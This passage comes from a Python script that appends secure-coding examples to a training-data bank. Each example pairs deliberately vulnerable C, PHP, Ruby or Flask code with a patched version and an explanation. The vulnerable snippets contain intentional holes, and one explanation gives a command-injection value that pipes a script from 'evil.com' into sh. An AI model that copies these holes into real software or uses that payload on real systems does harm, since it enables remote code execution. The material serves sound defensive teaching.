            "but are heavier. Note: pre-C11 code uses pthread mutexes."
        ),
        "cve_examples": ["CVE-2020-1971", "CVE-2014-9293"],
    },
    {
        "id": "PAT-058", "cwe": "CWE-78",
        "name": "C system() with attacker-controlled filename",
        "language": "c",
        "vulnerable": (
            "#include <stdio.h>\n"
            "#include <stdlib.h>\n"
            "void archive(const char *path) {\n"
            "    char cmd[512];\n"
            "    snprintf(cmd, sizeof(cmd), \"tar czf out.tgz %s\", path);\n"
            "    system(cmd);\n"
            "}"
        ),
        "patched": (
            "#include <unistd.h>\n"
            "#include <sys/wait.h>\n"
            "int archive(const char *path) {\n"
            "    pid_t pid = fork();\n"
            "    if (pid == 0) {\n"
            "        execlp(\"tar\", \"tar\", \"czf\", \"out.tgz\", path,\n"
            "               (char*)NULL);\n"
            "        _exit(127);\n"
            "    }\n"
            "    int status;\n"
            "    waitpid(pid, &status, 0);\n"
            "    return WIFEXITED(status) ? WEXITSTATUS(status) : -1;\n"
            "}"
        ),
        "explanation": (
            "`system()` runs its argument through /bin/sh, so a path "
            "of `foo; curl evil.com/x.sh | sh` triggers RCE. The "
            "patched version uses fork+execlp which spawns `tar` "
            "directly and passes `path` as a single argv element; "
            "the shell never tokenises it. `posix_spawn` is the "
            "modern equivalent and is preferred in new code."
        ),
        "cve_examples": ["CVE-2014-6271"],
    },
    # ---- More PHP --------------------------------------------------------
    {
        "id": "PAT-059", "cwe": "CWE-434",
        "name": "PHP unrestricted file upload",
        "language": "php",
        "vulnerable": (
            "<?php\n"
            "$dest = '/var/www/uploads/' . $_FILES['file']['name'];\n"
            "move_uploaded_file($_FILES['file']['tmp_name'], $dest);\n"
            "echo \"saved to $dest\";"
        ),
        "patched": (
            "<?php\n"
            "$f = $_FILES['file'];\n"
            "if ($f['error'] !== UPLOAD_ERR_OK) { http_response_code(400); exit; }\n"
            "if ($f['size'] > 5_000_000) { http_response_code(413); exit; }\n"
            "$mime = mime_content_type($f['tmp_name']);\n"
            "$allowed = ['image/png' => '.png', 'image/jpeg' => '.jpg'];\n"
            "if (!isset($allowed[$mime])) { http_response_code(415); exit; }\n"
            "$name = bin2hex(random_bytes(16)) . $allowed[$mime];\n"
            "move_uploaded_file($f['tmp_name'], '/var/www/uploads/' . $name);\n"
            "echo \"saved as $name\";"
        ),
        "explanation": (
            "Trusting `$_FILES['file']['name']` lets an attacker "
            "upload `shell.php` and visit it to get RCE. Even with "
            "renaming, accepting any MIME type allows malicious "
            "content; an SVG with embedded JavaScript fires XSS on "
            "view. The patched version: (a) checks the upload "
            "actually succeeded, (b) bounds the size, (c) sniffs "
            "the actual MIME type from content (not the client's "
            "claim), (d) restricts to a known-safe set, (e) renames "
            "with random bytes so the attacker can't predict the URL. "
            "Bonus: serve uploads from a separate domain with no PHP "
            "execution."
        ),
        "cve_examples": ["CVE-2022-24112"],
    },
    {
        "id": "PAT-060", "cwe": "CWE-113",
        "name": "PHP HTTP header injection via header()",
        "language": "php",
        "vulnerable": (
            "<?php\n"
            "$lang = $_GET['lang'];\n"
            "header(\"Content-Language: $lang\");"
        ),
        "patched": (
            "<?php\n"
            "$lang = $_GET['lang'] ?? 'en';\n"
            "$allowed = ['en', 'fr', 'es', 'de', 'sw'];\n"
            "if (!in_array($lang, $allowed, true)) { $lang = 'en'; }\n"
            "header(\"Content-Language: $lang\");"
        ),
        "explanation": (
            "Modern PHP (>= 5.1.2) rejects \\r\\n in header values, "
            "so classic response-splitting is blocked. But "
            "uncontrolled values still let an attacker set "
            "Content-Type to text/html (poisoning a JSON endpoint), "
            "Content-Disposition to filename=evil.exe, or other "
            "values that change browser behaviour. The patched "
            "version restricts the header value to a known set. "
            "If you must allow free-form, validate against a strict "
            "regex matching only allowed characters."
        ),
        "cve_examples": [],
    },
    # ---- More Ruby -------------------------------------------------------
    {
        "id": "PAT-061", "cwe": "CWE-502",
        "name": "Ruby Marshal.load on user-controlled blob",
        "language": "ruby",
        "vulnerable": (
            "def load_session(cookie)\n"
            "  Marshal.load(Base64.decode64(cookie))\n"
            "end"
        ),
        "patched": (
            "require 'json'\n"
            "def load_session(cookie)\n"
            "  decoded = Base64.decode64(cookie)\n"
            "  data = JSON.parse(decoded, symbolize_names: true)\n"
            "  raise 'malformed' unless data.is_a?(Hash)\n"
            "  data\n"
            "end"
        ),
        "explanation": (
            "`Marshal.load` deserializes arbitrary Ruby objects, "
            "calling their `marshal_load` and `_load` methods, "
            "which gadget chains in Rails and Gem internals turn "
            "into RCE. The classic Rails CVE-2013-0156 was a "
            "Marshal-via-YAML chain. Use JSON for session/cookie "
            "data; if you need richer types, define an explicit "
            "schema and reject unknown fields. Rails 4+ encrypts "
            "and signs cookies by default but the underlying "
            "Marshal.load is still the wrong primitive for "
            "untrusted data."
        ),
        "cve_examples": ["CVE-2013-0156"],
    },
    # ---- More Python -----------------------------------------------------
    {
        "id": "PAT-062", "cwe": "CWE-1004",
        "name": "Python Flask session cookie missing HttpOnly + Secure",
        "language": "python",
        "vulnerable": (
            "from flask import Flask\n"
            "app = Flask(__name__)\n"
            "app.config['SECRET_KEY'] = 'replace-me'"
        ),
        "patched": (
            "from flask import Flask\n"
            "import os\n"
            "app = Flask(__name__)\n"
            "app.config.update(\n"
            "    SECRET_KEY=os.environ['SECRET_KEY'],\n"
            "    SESSION_COOKIE_HTTPONLY=True,\n"
            "    SESSION_COOKIE_SECURE=True,\n"
            "    SESSION_COOKIE_SAMESITE='Lax',\n"
            "    PERMANENT_SESSION_LIFETIME=3600,\n"
            ")"
        ),
        "explanation": (
            "Flask's default session cookie is signed but not "
            "encrypted, and absent explicit config, lacks HttpOnly + "
            "Secure + SameSite. A reflected XSS reads the cookie via "
            "JavaScript (no HttpOnly), an MITM downgrade attack "
            "captures it on plaintext HTTP (no Secure), and a "
            "cross-site request from evil.com submits with it (no "
            "SameSite). The patched version sets all three, plus a "
            "session lifetime so abandoned sessions expire."
        ),
        "cve_examples": [],
    },
]


def main() -> int:
    if not BANK.exists():
        print(f"[error] bank not found: {BANK}", file=sys.stderr)
        return 1
    existing_ids = set()
    with BANK.open("r", encoding="utf-8") as f:
        for line in f:
            line = line.strip()
            if not line:
                continue
            try:
                rec = json.loads(line)
            except json.JSONDecodeError:
                continue
            existing_ids.add(rec.get("id"))
    print(f"  Existing patterns: {len(existing_ids)}")

    appended = 0
    with BANK.open("a", encoding="utf-8") as f:
        for p in NEW_PATTERNS:
            if p["id"] in existing_ids:
                continue
            f.write(json.dumps(p, ensure_ascii=False) + "\n")
            appended += 1
    print(f"  Appended:          {appended}")
    print(f"  Total now:         {len(existing_ids) + appended}")
    print()
    print("Re-run synth to produce updated SFT corpus:")
    print("  PYTHONPATH=. python3 scripts/synth_code_security.py \\")
    print("      --bank data/raw/code_security_patterns.jsonl \\")
    print("      --out data/processed/synth_code_security.jsonl")
    return 0


if __name__ == "__main__":
    sys.exit(main())
